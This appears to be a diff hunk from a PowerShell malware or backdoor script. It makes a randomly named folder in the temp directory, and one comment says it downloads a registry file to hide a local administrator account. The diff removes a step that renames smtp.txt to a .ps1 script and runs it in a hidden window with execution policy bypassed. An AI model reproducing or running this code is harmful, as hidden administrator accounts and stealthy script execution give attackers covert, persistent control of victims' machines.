@@ -30,14 +30,11 @@ $directory = random_text
 $temp_dir = "$env:TEMP\$directory"
 # save current directory
 $curr_dir = Get-Location|%{$_.Path}
-# $ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress
+# $ip = (Get-NetIPAddress -AddressFamily IPv4|?{$_.InterfaceAlias -ne 'Loopback Pseudo-Interface 1'}).IPAddress|select -Last 1|Out-String
 
 # goto temp and make working directory
 mkdir $temp_dir
 cd $temp_dir
-
-mv "$curr_dir\smtp.txt" ".\smtp.ps1"
-powershell powershell.exe -noP -ep bypass -w hidden -c ".\smtp.ps1"
 
 # Download registry to hide local admin
 $reg_file = random_text
